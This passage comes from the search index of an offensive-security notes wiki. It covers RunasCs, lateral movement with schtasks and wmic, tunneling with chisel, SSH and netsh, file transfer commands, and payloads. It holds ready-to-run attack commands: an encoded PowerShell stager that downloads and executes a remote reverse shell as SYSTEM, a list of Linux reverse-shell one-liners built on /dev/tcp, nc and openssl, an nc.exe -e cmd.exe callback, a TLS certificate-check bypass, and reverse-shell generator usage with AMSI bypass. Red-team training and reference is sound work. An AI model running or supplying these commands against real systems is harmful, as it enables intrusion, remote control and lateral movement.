[--remote-impersonation]\n\nDescription:\n    RunasCs is an utility to run specific processes under a different user account\n    by specifying explicit credentials. In contrast to the default runas.exe command\n    it supports different logon types and CreateProcess* functions to be used, depending\n    on your current permissions. Furthermore it allows input/output redirection (even\n    to remote hosts) and you can specify the password directly on the command line.\n\nPositional arguments:\n    username                username of the user\n    password                password of the user\n    cmd                     commandline for the process\n\nOptional arguments:\n    -d, --domain domain\n                            domain of the user, if in a domain.\n                            Default: \"\"\n    -f, --function create_process_function\n                            CreateProcess function to use. When not specified\n                            RunasCs determines an appropriate CreateProcess\n                            function automatically according to your privileges.\n                            0 - CreateProcessAsUserW\n                            1 - CreateProcessWithTokenW\n                            2 - CreateProcessWithLogonW\n    -l, --logon-type logon_type\n                            the logon type for the token of the new process.\n                            Default: \"2\" - Interactive\n    -t, --timeout process_timeout\n                            the waiting time (in ms) for the created process.\n                            This will halt RunasCs until the spawned process\n                            ends and sent the output back to the caller.\n                            If you set 0 no output will be retrieved and a\n                            background process will be created.\n                            Default: \"120000\"\n    -r, --remote host:port\n                            redirect stdin, stdout and stderr to a remote host.\n                            Using this option sets the process_timeout to 0.\n    -p, --force-profile\n                            force the creation of the user profile on the machine.\n                            This will ensure the process will have the\n                            environment variables correctly set.\n                            WARNING: If non-existent, it creates the user profile\n                            directory in the C:\\Users folder.\n    -b, --bypass-uac\n                            try a UAC bypass to spawn a process without\n                            token limitations (not filtered).\n    -i, --remote-impersonation\n                            spawn a new process and assign the token of the\n                            logged on user to the main thread.\n\nExamples:\n    Run a command as a local user\n        RunasCs.exe user1 password1 \"cmd /c whoami /all\"\n    Run a command as a domain user and logon type as NetworkCleartext (8)\n        RunasCs.exe user1 password1 \"cmd /c whoami /all\" -d domain -l 8\n    Run a background process as a local user,\n        RunasCs.exe user1 password1 \"C:\\tmp\\nc.exe 10.10.10.10 4444 -e cmd.exe\" -t 0\n    Redirect stdin, stdout and stderr of the specified command to a remote host\n        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444\n    Run a command simulating the /netonly flag of runas.exe\n        RunasCs.exe user1 password1 \"cmd /c whoami /all\" -l 9\n    Run a command as an Administrator bypassing UAC\n        RunasCs.exe adm1 password1 \"cmd /c whoami /priv\" --bypass-uac\n    Run a command as an Administrator through remote impersonation\n        RunasCs.exe adm1 password1 \"cmd /c echo admin &gt; C:\\Windows\\admin\" -l 8 --remote-impersonation\n</code></pre>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/schtasks/","title":"Schtasks","text":"<p>Tip</p> <p>This note is a work-in-progress.</p> <pre><code># Create Remote Task\nschtasks /create /S &lt;remote_host&gt; /SC once /ST 12:00 /RU SYSTEM /TN &lt;task_name&gt; /TR &lt;command_to_run&gt;\n\n# /S &lt;string&gt;  --&gt; Target host to run\n# /RU &lt;string&gt; --&gt; User to run as (current user doesn't require password)\n# /RP &lt;string&gt; --&gt; Password for the specified user\n# /ST &lt;string&gt; --&gt; Start time\n# /SD &lt;string&gt; --&gt; Start date\n\n# Manually Execute Remote Task\nschtasks /run /S &lt;remote_host&gt; /TN &lt;task_name&gt;\n\n# Manually Delete Remote Task\nschtasks /delete /S &lt;remote_host&gt; /TN &lt;task_name&gt;\n\n# Query Remote task\nschtasks /query /S &lt;remote_host&gt; /TN &lt;task_name&gt; /FO list /V\n\n# Example: Lateral Movement via RevShell Stager\nschtasks /create /S host.example.com /SC once /ST 12:00 /RU SYSTEM /TN Pwned /TR \"powershell -nop -ex bypass -wi h -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADEAMAAvAHIAZQB2AHMAaABlAGwAbAAnACkAKQA=\"\n</code></pre>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Lateral%20Movement/wmic/","title":"Wmic","text":"<p>Tip</p> <p>This note is a work-in-progress.</p> <p>The below WMIC syntax requires the victim to: - Have WMI enabled. - Have the remote executing user be apart of the \"Local Administrators\" group.</p> <pre><code># Syntax\nwmic /node:&lt;victim_ip&gt; process call create \"&lt;command_to_execute&gt;\"\n\n# Example: Lateral Movement via RevShell Stager\nwmic /node:\"host.example.com\" process call create \"powershell -nop -ex bypass -wi h -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADEAMAAvAHIAZQB2AHMAaABlAGwAbAAnACkAKQA=\"\n</code></pre>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/Chisel/","title":"Chisel","text":""},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/Chisel/#overview","title":"Overview","text":"<p>Info</p> <p>The chisel Github repository can be found here.</p> <p>Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH.  It is a power modular tool that allows tunneling and port forwarding from a single executable (i.e., both client and server).</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/Chisel/#installation","title":"Installation","text":""},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/Chisel/#option-1-download-from-github","title":"Option 1: Download from Github","text":"<pre><code># Download and clean-up the Linux version of Chisel v1.9.1\nwget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz\ngunzip chisel_1.9.1_linux_amd64.gz\nmv chisel_1.9.1_linux_amd64 chisel\n\n# Download and clean-up the Windows version of Chisel v1.9.1\nwget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz\ngunzip chisel_1.9.1_windows_amd64.gz\nmv chisel_1.9.1_windows_amd64 chisel.exe\n</code></pre>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/Chisel/#option-2-download-from-rgbwiki","title":"Option 2: Download from RGBwiki","text":"<p>Info</p> <p>Download chisel_1.9.1 (64-bit) binaries for Linux and Windows here.</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/Chisel/#option-3-install-using-apt","title":"Option 3: Install using apt","text":"<p>As of version 1.9.1, <code>chisel</code> can now be downloaded on Kali using <code>apt</code>.</p> <pre><code>sudo apt install chisel -y\n</code></pre>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/Chisel/#usage","title":"Usage","text":""},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/Chisel/#socks-proxy","title":"SOCKS Proxy","text":"<p>On our attacker, modify the last line of <code>/etc/proxychains4.conf</code> to utilize SOCKS5. <pre><code>sudo nano /etc/proxychains4.conf\n</code></pre></p> <p></p> <p>With the pre-requisites taken care of, we just need to move a <code>chisel</code> binary to the victim to  establish a tunnel.</p> <pre><code># Attacker: Setup chisel listener\n./chisel server -p &lt;srv_port&gt; --reverse\n\n# Victim: Establish chisel callback\n./chisel.exe client &lt;attacker_ip&gt;:&lt;srv_port&gt; R:socks\n\n# Attacker: Proxy commands through victim\nproxychains -q &lt;command&gt;\n</code></pre> <p>This will start a <code>chisel</code> server listener on our attacker using an arbitrary port, but once the connection is made by the uploaded <code>chisel</code> client on the compromised host, we can tunnel commands through the SOCKS5 proxy using <code>proxychains</code>.</p> <p>Visual Diagram: <pre><code>flowchart LR\n\nA(Attacker&lt;br&gt;10.10.1.5:7575)\nB{Client 1&lt;br&gt;10.10.1.10&lt;br&gt;192.168.1.10}\nC(Client 2&lt;br&gt;192.168.1.11)\nD(Client 3&lt;br&gt;192.168.1.12)\nE(Client 4&lt;br&gt;192.168.1.13)\n\nB --&gt; | Step 1:&lt;br&gt;10.10.1.10 -&gt; 10.10.1.5:7575 | A\nA --&gt; | Step 2:&lt;br&gt;SOCKS5 Proxy | B\n\nB --&gt; C\nB --&gt; D\nB --&gt; E</code></pre></p> <p>(Note: in the above example, the attacker had a <code>chisel</code> server listening on port 7575, and established a SOCKS5 proxy once the <code>chisel</code> client on Client 1 called back.  This allows the attacker to now reach Clients 2-4 through <code>proxychains</code>.)</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/Chisel/#port-forwarding","title":"Port Forwarding","text":"<p>Port forwarding can be done to allow an attacker to access services on a target that are listening locally (e.g., MySQL database on 127.0.0.1:3306).</p> <pre><code># Attacker: Setup chisel server\n./chisel server -p &lt;srv_port&gt; --reverse\n\n# Victim: Forward local port to attacker port\n./chisel.exe client &lt;attacker_ip&gt;:&lt;srv_port&gt; R:&lt;attacker_port&gt;:127.0.0.1:&lt;service_port&gt;\n\n# Attacker: Access victim port locally\n&lt;command&gt; 127.0.0.1:&lt;attacker_port&gt;\n</code></pre> <p>Visual Diagram: <pre><code>flowchart LR\n\nA(Attacker&lt;br&gt;10.10.1.5:7575)\nB{Client 1&lt;br&gt;10.10.1.10&lt;br&gt;MySQL -&gt; 127.0.01:3306}\n\nB --&gt; | Step 1:&lt;br&gt;10.10.1.10 -&gt; 10.10.1.5:7575 | A\nB --&gt; | Step 2:&lt;br&gt;R:3306:127.0.0.1:3306 | A\nA --&gt; | Step 3:&lt;br&gt;mysql -h 127.0.0.1 | B</code></pre></p> <p>(Note: in the above example, the attacker had a <code>chisel</code> server listening on port 7575, and established a port forward to the local MySQL database once the <code>chisel</code> client on Client 1 called back.  This allows the attacker to now reach Client 1's MySQL server on his own system using <code>mysql -h 127.0.0.1 -u &lt;username&gt; -p</code>)</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/SSH/","title":"SSH","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/SSH/#overview","title":"Overview","text":"<p>SSH tunneling or SSH port forwarding is a method of creating an encrypted SSH connection between a client and a server machine through which services ports can be relayed.</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/SSH/#usage","title":"Usage","text":""},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/SSH/#socks-proxy-tunneling","title":"SOCKS Proxy (Tunneling)","text":"<p>On our attacker, modify the last line of <code>/etc/proxychains4.conf</code> to utilize SOCKS5, and take note of the proxy port. <pre><code>sudo nano /etc/proxychains4.conf\n</code></pre></p> <p></p> <p>Below is one of the simplest and most straight forward tunnelling methods, useful for when you have SSH credentials to a box. <pre><code># Terminal 1: Establish a tunnel into the network\nssh &lt;user&gt;@&lt;ip_address&gt; -p &lt;ssh_port&gt; -D &lt;proxy_port&gt;\n\n# Terminal 2: Proxy commands through victim\nproxychains -q &lt;command&gt;\n</code></pre></p> <p>This will start an <code>ssh</code> tunnel and allow us to tunnel commands through the SOCKS5 proxy using <code>proxychains</code>.</p> <p>Visual Diagram: <pre><code>flowchart LR\n\nA(Attacker&lt;br&gt;10.10.1.5)\nB{Client 1&lt;br&gt;SSH -&gt; 10.10.1.10:22&lt;br&gt;192.168.1.10}\nC(Client 2&lt;br&gt;192.168.1.11)\nD(Client 3&lt;br&gt;192.168.1.12)\nE(Client 4&lt;br&gt;192.168.1.13)\n\nA --&gt; | Step 1:&lt;br&gt;10.10.1.5 -&gt; 10.10.1.10:22 | B\nA --&gt; | Step 2:&lt;br&gt;SOCKS Proxy | B\n\nB --&gt; C\nB --&gt; D\nB --&gt; E</code></pre></p> <p>(Note: in the above example, the attacker established an <code>SSH</code> tunnel with Client 1.  This allows the attacker to now reach Clients 2-4 through <code>proxychains</code>.)</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/SSH/#port-forwarding","title":"Port Forwarding","text":"<p>Uhhhh....</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/netsh/","title":"Netsh","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/netsh/#overview","title":"Overview","text":"<p>Netsh is a command-line scripting utility that allows you to display or modify network configuration settings. The portproxy function within Netsh enables you to configure port forwarding and address translation for network traffic between different systems, facilitating routing and redirection of network traffic from one port to another.</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/netsh/#usage","title":"Usage","text":""},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/netsh/#port-forwarding","title":"Port Forwarding","text":"<p><code>netsh</code> can be utilized to port forward on Windows clients.</p> <pre><code># Victim: Port forward on Client pointing towards a second target\nnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=&lt;local_port&gt; connectaddress=&lt;destination_host&gt; connectport=&lt;destination_port&gt;\n\n# Victim: Add a Firewall rule to allow traffic through open port\nnetsh advfirewall firewall add rule name=\"Example Port Forward\" dir=in action=allow protocol=TCP localport=&lt;local_port&gt;\n</code></pre> <p>Visual Diagram:</p> <p><pre><code>flowchart LR\n\nA{Attacker&lt;br&gt;10.10.1.10}\nB{Client 1&lt;br&gt;10.10.1.10&lt;br&gt;192.168.1.10}\nC{Client 2&lt;br&gt;192.168.1.11}\n\nA --&gt; | Step 2:&lt;br&gt;10.10.1.10:6969 | B\nB --&gt; | Step 1:&lt;br&gt;0.0.0.0:6969 -&gt; 192.168.1.11:445 | C</code></pre> (Note: in the above example, Client 1 established a local port forward redirecting to )</p>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/netsh/#old-shit","title":"Old Shit","text":"<p>Below is port forwarding syntax allowing us to forward traffic back to a port on our attacker (e.g., access to a simple web server hosting tools)</p> <pre><code>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=&lt;client_port&gt; connectaddress=&lt;attacker_ip&gt; connectport=&lt;attacker_port&gt;\n</code></pre> <p>Above code would be running on a compromised  and allow  to reach a specified port on our attacker box.  <p>Shitty Diagram Below: <pre><code>                        | FW |\n&lt;client_02&gt; ---&gt; &lt;client_01&gt;:&lt;port&gt; ---&gt; &lt;attacker_ip&gt;&lt;port&gt;\n                        | FW |\n</code></pre></p> <p>Diagram V2:</p> <pre><code># Attacker: 192.168.1.10 | Client 1: 192.168.1.11, 10.10.10.11 | Client 2: 10.10.10.12 \n\n# Port forward on Client 1 allowing attacker to reach port 445 on Client 2\nnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=6969 connectaddress=10.10.10.12 connectport=445\n\nnetsh advfirewall firewall add rule name=\"Example Port Forward\" dir=in action=allow protocol=TCP localport=6969\n\n# Result: Attacker can now reach Client 2 (10.10.10.12:445) by hitting Client 1 (192.168.1.11:6969) | Pending Firewall\n\n\n# Port forward allowing Client 2 to download files from an Attacker web server\nnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=6969 connectaddress=192.168.1.10 connectport=80\n# Client 2 can now pull files from an Attacker web server (192.168.1.10:80) by hitting Client 1 (10.10.10.11:6969) | Pending Firewall\n</code></pre>"},{"location":"Red%20Cell/05.%20Tunneling%20%26%20Lateral%20Movement/Tunneling/netsh/#examples","title":"Examples","text":"<ul> <li>Attacker: 192.168.1.10</li> <li>Client 1 (Dual NIC'd): 192.168.1.11, 10.10.10.11</li> <li>Client 2: 10.10.10.12</li> </ul> <p>Example 1: </p> <pre><code># Victim: Port forward on Client 1 allowing Attacker to reach port 445 on Client 2\nnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=&lt;local_port&gt; connectaddress=&lt;destination_host&gt; connectport=&lt;destination_port&gt;\n\n# Victim: Add a Firewall rule to allow traffic through open port\nnetsh advfirewall firewall add rule name=\"Example Port Forward\" dir=in action=allow protocol=TCP localport=&lt;local_port&gt;\n\n# Attacker: Access\n</code></pre> <p>Visual Diagram:</p> <pre><code>flowchart LR\n\nA{Attacker&lt;br&gt;10.10.1.10}\nB{Client 1&lt;br&gt;10.10.1.10&lt;br&gt;192.168.1.10}\nC{Client 2&lt;br&gt;192.168.1.11}\n\nA --&gt; | Step 2:&lt;br&gt;10.10.1.10:6969 | B\nB --&gt; | Step 1:&lt;br&gt;0.0.0.0:6969 -&gt; 192.168.1.11:445 | C</code></pre> <p>Example 2:</p> <pre><code># Port forward allowing Client 2 to download files from an Attacker web server\nnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=6969 connectaddress=192.168.1.10 connectport=80\n\n# Add a Firewall rule to allow traffic through open port\nnetsh advfirewall firewall add rule name=\"Example Port Forward\" dir=in action=allow protocol=TCP localport=6969\n\n# Remove port proxy\nnetsh interface portproxy delete v4tov4 listenport=6969\n# Remove firewall rule\nnetsh advfirewall firewall delete rule name=\"Proxy all the things\"\n</code></pre> <ul> <li> <p>Mermaid Diagram: <pre><code>flowchart RL\n\nA{Client 2}\nB(to)\nC{Client 1}\nD(to)\nE{Attacker}\n\nA --&gt; | IP: 10.10.10.12 | B\nB --&gt; | IP: 10.10.10.11 | C\nB --&gt; | Port: 6969 | C\nC --&gt; | IP: 192.168.1.11 | D\nD --&gt; | IP: 192.168.1.10 | E\nD --&gt; | Port: 80 | E</code></pre></p> </li> <li> <p>Shitty ASCII Diagram: <pre><code>                        | FW |\n&lt;client_02&gt; ---&gt; &lt;client_01&gt;:&lt;port&gt; ---&gt; &lt;attacker_ip&gt;&lt;port&gt;\n                        | FW |\n</code></pre></p> </li> </ul>"},{"location":"Red%20Cell/06.%20File%20Transfers/","title":"File Transfers","text":"<ul> <li>File transferring is the process of moving files or data between different systems, either within the same network or across networks for exfiltrating sensitive information or delivering malware.</li> </ul>"},{"location":"Red%20Cell/06.%20File%20Transfers/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Hosting as the Attacker</li> <li>Linux File Transfers</li> <li>Windows File Transfers</li> </ul>"},{"location":"Red%20Cell/06.%20File%20Transfers/Hosting%20as%20the%20Attacker/","title":"Hosting as the Attacker","text":""},{"location":"Red%20Cell/06.%20File%20Transfers/Hosting%20as%20the%20Attacker/#python-http-web-server","title":"Python HTTP Web Server","text":"<ul> <li>Simplest method to host files, but only supports file downloads.</li> </ul> <pre><code># Simple HTTP Web Server on default port 8000 serving the current directory\npython -m http.server\n\n# Simple HTTP Web Server on port 80 serving a specified directory\npython -m http.server 80 --directory &lt;target_directory&gt;\n</code></pre>"},{"location":"Red%20Cell/06.%20File%20Transfers/Hosting%20as%20the%20Attacker/#impacket-smbserver","title":"impacket-smbserver","text":"<ul> <li>Simple SMB server that allows for both uploading and downloading files while capturing Net NTLM hashes.</li> </ul> <pre><code># SMB share hosting the current directory\nimpacket-smbserver &lt;share_name&gt; -smb2support .\n\n# SMB share hosting a specified directory\nimpacket-smbserver &lt;share_name&gt; -smb2support &lt;target_directory&gt;\n</code></pre>"},{"location":"Red%20Cell/06.%20File%20Transfers/Hosting%20as%20the%20Attacker/#poormansarmory","title":"PoorMansArmory","text":"<ul> <li>Custom Flask-based Python server that provides support for file downloads AND uploads, as well as support for encrypted communication over HTTPS using self-signed certificates.<ul> <li>Note: usage of HTTPS is more advanced and requires a self-signed certificate check bypass.</li> </ul> </li> <li>Link: https://github.com/tylerdotrar/PoorMansArmory</li> </ul> <pre><code># PoorMansArmory web server on default port 80 with default directory './uploads'\npython ./pma_server.py\n\n# PoorMansArmory web server on custom port with specified directory\npython ./pma_server.py --port 8080 --directory /usr/share/windows-binaries\n\n# PoorMansArmory web server using HTTPS on specified port (more advanced)\npython ./pma_server.py --port 443 --ssl\n</code></pre>"},{"location":"Red%20Cell/06.%20File%20Transfers/Linux%20File%20Transfers/","title":"Linux File Transfers","text":"<p>For a collection of methods on hosting, reference my Hosting as the Attacker note.</p>"},{"location":"Red%20Cell/06.%20File%20Transfers/Linux%20File%20Transfers/#downloading-and-uploading-via-common-web-tools","title":"Downloading and Uploading via Common Web Tools","text":"<p>CURL - Supports both downloading and uploading files.</p> <pre><code># Download File from Web Server\ncurl http://&lt;ip_addr&gt;/&lt;filename&gt; -o &lt;outfile&gt;\n\n# Download File from custom HTTPS Web Server\ncurl https://&lt;ip_addr&gt;/&lt;filename&gt; -o &lt;outfile&gt; -k\n\n# Upload File to Web Server\ncurl -X POST -F \"file=@&lt;file_path&gt;\" http(s)://&lt;ip_addr&gt;/&lt;filename&gt;\n\n# Upload File to custom HTTPS Web Server\ncurl -X POST -F \"file=@&lt;file_path&gt;\" http(s)://&lt;ip_addr&gt;/&lt;filename&gt; -k\n</code></pre> <p>WGET - Supports only downloading files.</p> <pre><code># Download File from Web Server\nwget http://&lt;ip_addr&gt;/&lt;filename&gt; -O &lt;outfile&gt;\n\n# Download File from custom HTTPS Web Server\nwget https://&lt;ip_addr&gt;/&lt;filename&gt; -O &lt;outfile&gt; --no-check-certificate\n</code></pre>"},{"location":"Red%20Cell/06.%20File%20Transfers/Linux%20File%20Transfers/#downloading-and-uploading-via-smb","title":"Downloading and Uploading via SMB","text":"<pre><code># Download File from Share\nsmbclient //&lt;ip_addr&gt;/share/ -N -c 'get &lt;filename&gt;'\n\n# Upload File to Share\nsmbclient //&lt;ip_addr&gt;/share/ -N -c \"put &lt;filename&gt;\"\n</code></pre>"},{"location":"Red%20Cell/06.%20File%20Transfers/Linux%20File%20Transfers/#alternative-methods","title":"Alternative Methods","text":"<p>Assuming SSH is enabled, you can use SCP.</p> <pre><code># File Download via SCP\nscp &lt;username&gt;@&lt;ip_addr&gt;:&lt;file_path&gt; &lt;outfile&gt;\n\n# File Upload via SCP\nscp &lt;file_path&gt; &lt;username&gt;@&lt;ip_addr&gt;:&lt;out_path&gt;\n</code></pre>"},{"location":"Red%20Cell/06.%20File%20Transfers/Windows%20File%20Transfers/","title":"Windows File Transfers","text":"<p>For a collection of methods on hosting, reference my Hosting as the Attacker note.</p>"},{"location":"Red%20Cell/06.%20File%20Transfers/Windows%20File%20Transfers/#downloading-via-built-in-windows-utilities","title":"Downloading via built-in Windows Utilities","text":"<pre><code># Built in Certutil Utility\ncertutil -urlcache -f http://&lt;ip_addr&gt;/&lt;filename&gt; &lt;outfile&gt;\n\n# Built in bitsadmin Utility\nbitsadmin /TRANSFER &lt;job_name&gt; http://&lt;ip_addr&gt;/&lt;filename&gt; \"$PWD/&lt;outfile&gt;\"\n\n# Native PowerShell Command\nInvoke-WebRequest http://&lt;ip_addr&gt;/&lt;filename&gt; -UseBasicParsing -OutFile &lt;outfile&gt;\n</code></pre>"},{"location":"Red%20Cell/06.%20File%20Transfers/Windows%20File%20Transfers/#downloading-and-uploading-via-powershell","title":"Downloading and Uploading via PowerShell","text":"<pre><code>### PowerShell 2.0+ WebClient\n# Download File from Web Server\n(New-Object System.Net.WebClient).DownloadFile(\"http(s)://&lt;ip_addr&gt;/&lt;filename&gt;\",\"&lt;outfile&gt;\")\n\n# Upload File top Web Server\n(New-Object System.Net.WebClient).UploadFile(\"http(s)://&lt;ip_addr&gt;/&lt;filename&gt;\",\"&lt;outfile&gt;\")\n\n\n### PowerShell 5.0+ WebClient\n# Download Filr from Web Server\n[System.Net.WebClient]::new().DownloadFile(\"http(s)://&lt;ip_addr&gt;/&lt;filename&gt;\",\"&lt;outfile&gt;\")\n\n# Upload File to Web Server\n[System.Net.WebClient]::new().UploadFile(\"http(s)://&lt;ip_addr&gt;/&lt;filename&gt;\",\"&lt;file_path&gt;\")\n\n\n### Advanced: PoorMansArmory HTTPS File Transfer Support\n# Bypass the WebClient self-signed certificate check within the current session\n$Bypass = @'\nusing System;\nusing System.Net;\nusing System.Net.Security;\nusing System.Security.Cryptography.X509Certificates;\npublic class SelfSignedCerts\n{\n    public static void Bypass()\n    {\n        ServicePointManager.ServerCertificateValidationCallback =\n            delegate\n            (\n                Object obj,\n                X509Certificate certificate,\n                X509Chain chain,\n                SslPolicyErrors errors\n            )\n            {\n                return true;\n            };\n    }\n}\n'@\nAdd-Type $Bypass;\n[SelfSignedCerts]::Bypass();\n</code></pre>"},{"location":"Red%20Cell/06.%20File%20Transfers/Windows%20File%20Transfers/#downloading-and-uploading-via-smb","title":"Downloading and Uploading via SMB","text":"<pre><code># Download File from Share\ncopy \\\\&lt;ip_addr&gt;\\&lt;share_name&gt;\\&lt;filename&gt; &lt;outfile&gt;\n\n# Upload File to Share\ncopy &lt;filename&gt; \\\\&lt;ip_addr&gt;\\&lt;share_name&gt;\\&lt;filename&gt;\n</code></pre>"},{"location":"Red%20Cell/06.%20File%20Transfers/Windows%20File%20Transfers/#alternative-methods","title":"Alternative Methods","text":"<pre><code>### Using ncat.exe\n# Attacker: Create Listener waiting for File\nnc -nvlp &lt;port&gt; &gt; &lt;outfile&gt;\n\n# Victim: Upload File Bytes\ntype &lt;filename&gt; | ./nc.exe &lt;ip_addr&gt; &lt;port&gt;\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/","title":"Payloads","text":"<ul> <li>Payloads are the specific code in an attack (generally initial access) aimed at performing a specific actions on a targeted system, such as delivering malware, executing exploits, or enabling unauthorized access.</li> </ul>"},{"location":"Red%20Cell/07.%20Payloads/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Linux Reverse Shells</li> <li>PowerShell Reverse Shells</li> </ul>"},{"location":"Red%20Cell/07.%20Payloads/#microsoft-office-macros","title":"Microsoft Office Macros","text":"<ul> <li>Remote Template Injection</li> </ul>"},{"location":"Red%20Cell/07.%20Payloads/#php","title":"PHP","text":"<ul> <li>Limited Webshell</li> <li>PHPinfo</li> <li>Reverse Shell</li> <li>TinyShell</li> </ul>"},{"location":"Red%20Cell/07.%20Payloads/Linux%20Reverse%20Shells/","title":"Linux Reverse Shells","text":"<p>There are a handful of killer resources for establishing shells. Go-to-resource for simple reverse shells: https://revshells.com</p>"},{"location":"Red%20Cell/07.%20Payloads/Linux%20Reverse%20Shells/#attacker-listener","title":"Attacker (Listener)","text":"<p><code>nc</code> is generally used as the listener for a reverse shell, however <code>ncat</code> is Nmap's fork of <code>nc</code> which provides optional SSL support for encrypted communications.</p> <p>Start up a standard reverse shell listener with the following command:</p> <pre><code>nc -lvnp &lt;port&gt;\n</code></pre> <p>Start up a reverse shell listener with SSL support:</p> <pre><code>ncat --ssl -lvnp &lt;port&gt;\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/Linux%20Reverse%20Shells/#standard-reverse-shell","title":"Standard Reverse Shell","text":"<p>On Linux, the sheer quantity of dependencies and programs that may or may not be installed makes it difficult to recommend a commonly used command, but I will provide a couple common ones below.</p> <pre><code># bash -i Callback\nsh -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1\n\n# Busybox nc -e\nbusybox nc &lt;attacker_ip&gt; &lt;port&gt; -e sh\n\n# mkfifo / nc Callback\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc &lt;attacker_ip&gt; &lt;port&gt; &gt;/tmp/f\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/Linux%20Reverse%20Shells/#ssl-encrypted-reverse-shell","title":"SSL Encrypted Reverse Shell","text":"<p>For SSL encrypted reverse shells, the victim should either have <code>ncat</code> installed or <code>openssl</code></p> <pre><code># mkfifo / openssl Encrypted Callback\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | openssl s_client -connect &lt;attacker_ip&gt;:&lt;port&gt; 2&gt;&amp;1 &gt; /tmp/f &amp; disown\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/PowerShell%20Reverse%20Shells/","title":"PowerShell Reverse Shells","text":"<p>Tip</p> <p>My custom reverse shell generator can be found here: https://github.com/tylerdotrar/PoorMansArmory</p> <ul> <li>PoorMansArmory/revshells/Get-RevShell.ps1</li> <li>PoorMansArmory/revshells/Get-Stager.ps1</li> </ul> <pre><code># Simple PowerShell Reverse Shell (base64)\nGet-RevShell &lt;attacker_ip&gt; &lt;listening_port&gt;\n\n# Simple PowerShell Reverse Shell (cleartext)\nGet-RevShell &lt;attacker_ip&gt; &lt;listening_port&gt; -Raw\n\n# PowerShell 2.0 Compatible Reverse Shell w/ Verbose Variables (cleartext)\nGet-RevShell &lt;attacker_ip&gt; &lt;listening_port&gt; -Raw -Verbose -PowerShell2Support\n\n# SSL Encrypted PowerShell Reverse Shell w/ AMSI Bypass (base64)\nGet-RevShell &lt;attacker_ip&gt; &lt;listening_port&gt; -SSL -AmsiBypass\n\n# Cleartext Stager pointing to Robust PowerShell Reverse Shell\nGet-RevShell &lt;attacker_ip&gt; &lt;listening_port&gt; -SSL -AmsiBypass -WebClientHelpers &gt; ./downloads/revshell\nGet-Stager http(s)://&lt;attacker_ip&gt;:&lt;attacker_port&gt;/revshell -Raw\n\n# View all parameters\nGet-RevShell -Help\nGet-Stager -Help\n</code></pre>"},{"location":"Red%20Cell/07.%20Payloads/PowerShell%20Reverse%20Shells/#standard-reverse-shell","title":"Standard Reverse Shell","text":"<p>There are only minute payload difference between standard PowerShell 5.0+ and the older PowerShell 2.0 in terms of functionality.  The primary differences are that the PowerShell 5.0+ payloads support information output streams and instantiate classes differently.</p> <p>In both scenarios, the attacker's listener is the same.</p> <pre><code># Listener with readline wrapper\nrlwrap nc -nlvp 